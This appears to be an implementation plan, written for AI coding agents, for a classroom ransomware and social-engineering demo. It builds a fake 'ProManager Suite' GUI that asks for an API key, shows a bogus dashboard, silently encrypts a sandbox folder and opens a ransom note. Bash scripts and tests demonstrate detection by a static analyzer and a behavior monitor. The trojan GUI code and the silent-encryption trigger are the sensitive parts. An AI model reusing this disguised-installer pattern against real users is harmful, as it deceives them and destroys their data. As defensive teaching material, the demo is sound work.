# Fake Manager Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build `fake_manager.py` — a Tkinter GUI fake "ProManager Suite" that asks for an API key, shows a convincing dashboard, then silently encrypts `victim_sandbox/` before displaying the ransom note.

**Architecture:** Three files: `fake_manager.py` (Tkinter GUI with 3 screens + standalone `trigger_encryption()` function), `demo_manager.sh` (bash orchestration with `--attack-only` / `--with-defender`), and `test_fake_manager.py` (2 pytest tests that exercise `trigger_encryption()` and `static_analyzer` without Tkinter). Reuses `RansomwareSimulator`, `static_analyzer`, and `behavior_monitor` from existing modules via `sys.path.insert`.

**Tech Stack:** Python 3.10+ · tkinter (stdlib) · ttk.Progressbar · threading · RansomwareSimulator (Fernet/cryptography) · yara-python · pytest · bash

---

### Task 1: test_fake_manager.py — Write failing tests first

**Files:**
- Create: `social-engineering/tests/test_fake_manager.py`

- [ ] **Step 1: Write test_fake_manager.py**

```python
import os
import sys
import pytest

_se_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
sys.path.insert(0, _se_root)
sys.path.insert(0, os.path.join(_se_root, '..', 'ransomware-demo'))

from defender.static_analyzer import analyze_file
from attacker.fake_manager import trigger_encryption


def test_static_analyzer_detects_fake_manager():
    """static_analyzer flags fake_manager.py as CRITICAL (YARA + dangerous strings)."""
    fake_manager_path = os.path.join(_se_root, 'attacker', 'fake_manager.py')
    findings = analyze_file(fake_manager_path)
    critical = [f for f in findings if f['severity'] == 'CRITICAL']
    assert len(critical) >= 1


def test_fake_manager_encrypts_sandbox(tmp_path):
    """trigger_encryption() encrypts all files in the given directory."""
    (tmp_path / 'data.txt').write_text('sensitive data')
    (tmp_path / 'report.csv').write_text('col1,col2\nval1,val2')

    trigger_encryption(str(tmp_path))

    encrypted = list(tmp_path.glob('*.encrypted'))
    assert len(encrypted) == 2
    assert not (tmp_path / 'data.txt').exists()
    assert not (tmp_path / 'report.csv').exists()
```

- [ ] **Step 2: Run tests — verify they fail with ImportError**

```bash
cd social-engineering
python3 -m pytest tests/test_fake_manager.py -v
```

Expected: `ImportError: cannot import name 'trigger_encryption' from 'attacker.fake_manager'` (file doesn't exist yet).

- [ ] **Step 3: Commit failing tests**

```bash
git add social-engineering/tests/test_fake_manager.py
git commit -m "test: add failing tests for fake_manager (TDD)"
```

---

### Task 2: fake_manager.py — Tkinter GUI with 3 screens

**Files:**
- Create: `social-engineering/attacker/fake_manager.py`

- [ ] **Step 1: Write fake_manager.py**

```python
import os
import sys
import time
import threading
import subprocess
import tkinter as tk
from tkinter import ttk

_base = os.path.dirname(os.path.abspath(__file__))
_ransomware_demo = os.path.abspath(os.path.join(_base, '..', '..', 'ransomware-demo'))
sys.path.insert(0, _ransomware_demo)

from attacker.ransomware_simulator import RansomwareSimulator

VICTIM_SANDBOX = os.path.join(_base, 'victim_sandbox')
RANSOM_NOTE = os.path.join(_ransomware_demo, 'attacker', 'ransom_note.html')

BG     = '#1e1e2e'
BG2    = '#313244'
BG3    = '#45475a'
FG     = '#cdd6f4'
FG_DIM = '#a6adc8'
FG_MUT = '#6c7086'
ACCENT = '#cba6f7'
C_RED  = '#f38ba8'
C_GRN  = '#a6e3a1'
C_YLW  = '#f9e2af'

FONT       = ('Segoe UI', 10)
FONT_BOLD  = ('Segoe UI', 10, 'bold')
FONT_BIG   = ('Segoe UI', 13, 'bold')
FONT_SMALL = ('Segoe UI', 9)
FONT_MONO  = ('Courier New', 10)


def trigger_encryption(sandbox_dir: str) -> None:
    sim = RansomwareSimulator(sandbox_dir=sandbox_dir)
    sim.encrypt()


class ProManagerApp:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title('ProManager Suite — License Activation')
        self.root.geometry('480x340')
        self.root.resizable(False, False)
        self.root.configure(bg=BG)
        self._frame = None
        self._show_activation()

    def _clear(self):
        if self._frame:
            self._frame.destroy()
        self._frame = tk.Frame(self.root, bg=BG)
        self._frame.pack(fill='both', expand=True, padx=24, pady=20)

    def _show_activation(self):
        self._clear()
        f = self._frame

        logo_row = tk.Frame(f, bg=BG)
        logo_row.pack(anchor='center', pady=(0, 12))
        tk.Label(logo_row, text='📋', font=('Segoe UI', 32), bg=BG).pack(side='left', padx=(0, 10))
        name_col = tk.Frame(logo_row, bg=BG)
        name_col.pack(side='left')
        tk.Label(name_col, text='ProManager Suite', font=FONT_BIG, bg=BG, fg=FG).pack(anchor='w')
        tk.Label(name_col, text='⊗  Unlicensed — Activation Required',
                 font=FONT_SMALL, bg=BG, fg=C_RED).pack(anchor='w')

        tk.Frame(f, bg=BG3, height=1).pack(fill='x', pady=10)

        tk.Label(f, text='API License Key', font=FONT_SMALL, bg=BG, fg=FG_DIM).pack(anchor='w')
        self._key_var = tk.StringVar()
        entry = tk.Entry(
            f, textvariable=self._key_var, font=FONT_MONO, bg=BG2, fg=FG,
            insertbackground=FG, relief='flat', bd=0,
            highlightthickness=1, highlightbackground=BG3, highlightcolor=ACCENT,
        )
        entry.pack(fill='x', ipady=6, pady=(4, 0))
        entry.insert(0, 'sk-xxxx-xxxx-xxxx-xxxxxxxxxxxx')
        entry.config(fg=FG_MUT)
        entry.bind('<FocusIn>', lambda e: (entry.delete(0, 'end'), entry.config(fg=FG)))
        entry.bind('<Return>', lambda e: self._on_activate())

        self._error_var = tk.StringVar()
        tk.Label(f, textvariable=self._error_var, font=FONT_SMALL,
                 bg=BG, fg=C_RED).pack(anchor='w', pady=(4, 0))

        btn_row = tk.Frame(f, bg=BG)
        btn_row.pack(fill='x', pady=(12, 0))
        tk.Button(
            btn_row, text='Activate License', font=FONT_BOLD, bg=ACCENT, fg=BG,
            relief='flat', bd=0, padx=20, pady=8, cursor='hand2',
            activebackground='#b4befe', activeforeground=BG,
            command=self._on_activate,
        ).pack(side='left')
        tk.Button(
            btn_row, text='Cancel', font=FONT, bg=BG3, fg=FG,
            relief='flat', bd=0, padx=16, pady=8, cursor='hand2',
            activebackground=BG2, activeforeground=FG,
            command=self.root.destroy,
        ).pack(side='left', padx=(8, 0))

        tk.Frame(f, bg=BG3, height=1).pack(fill='x', pady=(16, 8))
        tk.Label(f, text='⚠  DEMO ONLY — Academic Environment',
                 font=FONT_SMALL, bg=BG, fg=C_YLW).pack()

    def _on_activate(self):
        key = self._key_var.get().strip()
        if not key or key == 'sk-xxxx-xxxx-xxxx-xxxxxxxxxxxx':
            self._error_var.set('Please enter your API key.')
            return
        self._error_var.set('')
        self._show_verifying()

    def _show_verifying(self):
        self.root.title('ProManager Suite — Activating...')
        self._clear()
        f = self._frame

        tk.Label(f, text='Verifying license key...', font=FONT_BIG, bg=BG, fg=FG).pack(pady=(20, 4))
        self._status_var = tk.StringVar(value='Connecting to license server...')
        tk.Label(f, textvariable=self._status_var, font=FONT_SMALL, bg=BG, fg=FG_DIM).pack()

        self._pbar = ttk.Progressbar(f, mode='indeterminate', length=380)
        self._pbar.pack(pady=(20, 0))
        self._pbar.start(12)

        threading.Thread(target=self._do_activate, daemon=True).start()

    def _do_activate(self):
        for msg, delay in [
            ('Connecting to license server...', 0.6),
            ('Validating entitlements...', 0.7),
            ('Configuring workspace...', 0.7),
        ]:
            self.root.after(0, lambda m=msg: self._status_var.set(m))
            time.sleep(delay)
        self.root.after(0, self._show_dashboard)

    def _show_dashboard(self):
        self.root.title('ProManager Suite — Dashboard')
        self._clear()
        f = self._frame

        tk.Label(f, text='✓  License activated — Welcome!',
                 font=FONT_BOLD, bg=BG, fg=C_GRN).pack(anchor='w', pady=(0, 12))

        tk.Label(f, text='YOUR PROJECTS', font=('Segoe UI', 8, 'bold'),
                 bg=BG, fg=FG_MUT).pack(anchor='w')

        for name, status, color in [
            ('📁  Q4 Marketing Campaign', 'Active',      C_GRN),
            ('📁  Product Launch 2025',   'In Progress', C_YLW),
            ('📁  Client Onboarding Flow','Active',      C_GRN),
        ]:
            row = tk.Frame(f, bg=BG2)
            row.pack(fill='x', pady=2)
            tk.Label(row, text=name,   font=FONT,       bg=BG2, fg=FG,    padx=8, pady=6).pack(side='left')
            tk.Label(row, text=status, font=FONT_SMALL, bg=BG2, fg=color, padx=8).pack(side='right')

        tk.Label(f, text='Loading your data...', font=FONT_SMALL,
                 bg=BG, fg=FG_DIM).pack(anchor='w', pady=(12, 2))
        load_bar = ttk.Progressbar(f, mode='indeterminate', length=432)
        load_bar.pack(fill='x')
        load_bar.start(20)

        tk.Frame(f, bg=BG3, height=1).pack(fill='x', pady=(16, 8))
        tk.Label(f, text='⚠  DEMO ONLY — Academic Environment',
                 font=FONT_SMALL, bg=BG, fg=C_YLW).pack()

        threading.Thread(target=self._silent_encrypt, daemon=True).start()
        self.root.after(4000, self._trigger_ransom)

    def _silent_encrypt(self):
        trigger_encryption(VICTIM_SANDBOX)

    def _trigger_ransom(self):
        self.root.destroy()
        subprocess.Popen(
            ['xdg-open', RANSOM_NOTE],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

    def run(self):
        self.root.mainloop()


if __name__ == '__main__':
    ProManagerApp().run()
```

- [ ] **Step 2: Run tests — both should pass now**

```bash
cd social-engineering
python3 -m pytest tests/test_fake_manager.py -v
```

Expected output:
```
tests/test_fake_manager.py::test_static_analyzer_detects_fake_manager PASSED
tests/test_fake_manager.py::test_fake_manager_encrypts_sandbox PASSED
2 passed
```

If `test_fake_manager_encrypts_sandbox` fails with sandbox isolation error, check that `RansomwareSimulator` accepts any directory via its `sandbox_dir` parameter (it should — same pattern used in `fake_installer.py`).

- [ ] **Step 3: Run full test suite to verify no regressions**

```bash
cd social-engineering && python3 -m pytest tests/ -v
```

Expected: 8 passed (6 existing + 2 new).

- [ ] **Step 4: Commit**

```bash
git add social-engineering/attacker/fake_manager.py
git commit -m "feat: fake_manager.py - Tkinter GUI ProManager with 3 screens and silent encrypt"
```

---

### Task 3: demo_manager.sh — orchestration script

**Files:**
- Create: `social-engineering/demo_manager.sh`

- [ ] **Step 1: Write demo_manager.sh**

```bash
#!/bin/bash
set -e

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
ATTACKER_DIR="$SCRIPT_DIR/attacker"
VICTIM_SANDBOX="$ATTACKER_DIR/victim_sandbox"
BACKUP_DIR="$SCRIPT_DIR/.backups"

open_browser() {
  xdg-open "$1" 2>/dev/null || open "$1" 2>/dev/null || echo "  Open manually: $1"
}

backup_sandbox() {
  mkdir -p "$BACKUP_DIR"
  python3 - <<PYEOF
import tarfile, datetime, os
ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
archive = os.path.join('$BACKUP_DIR', f'victim_sandbox_{ts}.tar.gz')
with tarfile.open(archive, 'w:gz') as tar:
    tar.add('$VICTIM_SANDBOX', arcname='victim_sandbox')
print(f'  Backup saved: {os.path.basename(archive)}')
PYEOF
}

restore_sandbox() {
  python3 - <<PYEOF
import tarfile, glob, os, shutil
backups = sorted(glob.glob(os.path.join('$BACKUP_DIR', 'victim_sandbox_*.tar.gz')))
if not backups:
    print('  No backup found.')
    exit(0)
latest = backups[-1]
shutil.rmtree('$VICTIM_SANDBOX', ignore_errors=True)
os.makedirs('$VICTIM_SANDBOX', exist_ok=True)
parent = os.path.dirname('$VICTIM_SANDBOX')
with tarfile.open(latest, 'r:gz') as tar:
    tar.extractall(path=parent, filter='data')
print(f'  Restored from: {os.path.basename(latest)}')
PYEOF
}

MODE=""
for arg in "$@"; do
  case $arg in
    --attack-only)   MODE="attack" ;;
    --with-defender) MODE="defend" ;;
    --help)
      echo "Usage: bash demo_manager.sh [--attack-only | --with-defender]"
      echo "  --attack-only    Victim runs ProManager, files get encrypted"
      echo "  --with-defender  Static + behavioral defense stops the attack"
      exit 0 ;;
  esac
done

if [ -z "$MODE" ]; then
  echo -e "${YELLOW}Select demo mode:${NC}"
  echo "  1) --attack-only    (no defense)"
  echo "  2) --with-defender  (static + behavioral defense)"
  read -rp "Enter 1 or 2: " choice || choice="1"
  [ "$choice" = "2" ] && MODE="defend" || MODE="attack"
fi

cd "$SCRIPT_DIR"

# ─────────────────────────────────────────────────────────
# ATTACK-ONLY
# ─────────────────────────────────────────────────────────
if [ "$MODE" = "attack" ]; then
  echo -e "\n${RED}========================================
   FAKE MANAGER — ATTACK ONLY
========================================${NC}\n"

  echo -e "${GREEN}[STEP 1/6] Backing up victim_sandbox...${NC}"
  backup_sandbox; echo ""

  echo -e "${RED}[STEP 2/6] Social Engineering: Victim downloads ProManager.exe${NC}"
  echo "  Victim finds 'ProManager Suite' on a software site,"
  echo "  downloads it, and double-clicks to run."
  read -rp "  [Press Enter to launch ProManager]" || true; echo ""

  echo -e "${RED}[STEP 3/6] Victim runs ProManager.exe${NC}"
  echo "  (Enter any API key in the form and click Activate)"
  python3 attacker/fake_manager.py; echo ""

  echo -e "${RED}[STEP 4/6] victim_sandbox AFTER attack:${NC}"
  ls -la "$VICTIM_SANDBOX/"; echo ""

  echo -e "${RED}[STEP 5/6] Ransom note opened by app — check your browser${NC}"
  read -rp "  [Press Enter to restore files]" || true; echo ""

  echo -e "${GREEN}[STEP 6/6] Restoring victim_sandbox...${NC}"
  restore_sandbox; echo ""

  echo -e "${GREEN}========================================
   ATTACK DEMO COMPLETE
========================================${NC}"

# ─────────────────────────────────────────────────────────
# WITH-DEFENDER
# ─────────────────────────────────────────────────────────
elif [ "$MODE" = "defend" ]; then
  echo -e "\n${GREEN}========================================
   FAKE MANAGER — WITH DEFENDER
========================================${NC}\n"

  echo -e "${GREEN}[STEP 1/9] Backing up victim_sandbox...${NC}"
  backup_sandbox; echo ""

  echo -e "${BLUE}[STEP 2/9] Social Engineering: Victim downloads ProManager.exe${NC}"
  echo "  Before running, security team scans the file."
  read -rp "  [Press Enter to run static analysis]" || true; echo ""

  echo -e "${GREEN}[STEP 3/9] DEFENDER: Static analyzer scanning fake_manager.py...${NC}"
  python3 defender/static_analyzer.py attacker/fake_manager.py || true; echo ""

  echo -e "${RED}[STEP 4/9] ⚠ CRITICAL threats found — ProManager.exe is DANGEROUS${NC}"
  read -rp "  Bypass to demo behavioral defense? (y/N): " bypass || bypass="n"
  if [ "$bypass" != "y" ] && [ "$bypass" != "Y" ]; then
    echo -e "\n  ${GREEN}✓ Attack prevented at static analysis stage.${NC}"
    restore_sandbox
    exit 0
  fi; echo ""

  echo -e "${GREEN}[STEP 5/9] DEFENDER: Behavior monitor activated — watching victim_sandbox/${NC}"; echo ""

  echo -e "${BLUE}[STEP 6/9] Running fake_manager.py under monitoring...${NC}"
  echo "  (Enter any API key and click Activate)"
  python3 defender/behavior_monitor.py attacker/fake_manager.py "$VICTIM_SANDBOX" || true; echo ""

  echo -e "${GREEN}[STEP 7/9] Process killed by behavior monitor${NC}"; echo ""

  echo -e "${GREEN}[STEP 8/9] Prevention success page${NC}"
  open_browser "$SCRIPT_DIR/prevention_success.html"
  read -rp "  [Press Enter to restore files]" || true; echo ""

  echo -e "${GREEN}[STEP 9/9] Restoring victim_sandbox...${NC}"
  restore_sandbox; echo ""

  echo -e "${GREEN}========================================
   DEFENDER DEMO COMPLETE
========================================${NC}"
fi
```

- [ ] **Step 2: Make executable and test --help**

```bash
chmod +x social-engineering/demo_manager.sh
cd social-engineering && bash demo_manager.sh --help
```

Expected output:
```
Usage: bash demo_manager.sh [--attack-only | --with-defender]
  --attack-only    Victim runs ProManager, files get encrypted
  --with-defender  Static + behavioral defense stops the attack
```

- [ ] **Step 3: Smoke-test static analyzer path works**

```bash
cd social-engineering
python3 defender/static_analyzer.py attacker/fake_manager.py
echo "Exit code: $?"
```

Expected: CRITICAL findings printed, exit code 1.

- [ ] **Step 4: Run full test suite — 18 tests total**

```bash
cd ransomware-demo && python3 -m pytest tests/ -v
cd ../social-engineering && python3 -m pytest tests/ -v
```

Expected:
- ransomware-demo: 10 passed
- social-engineering: 8 passed (6 existing + 2 new)
- Total: 18 passed

- [ ] **Step 5: Commit**

```bash
git add social-engineering/demo_manager.sh
git commit -m "feat: demo_manager.sh with --attack-only and --with-defender for fake manager demo"
```

- [ ] **Step 6: Verify final state**

```bash
cd /path/to/ATBMHTTT
git status  # should be clean — all files committed in previous steps
git log --oneline -5
```

Expected: working tree clean, last 3 commits visible (tests, fake_manager.py, demo_manager.sh).
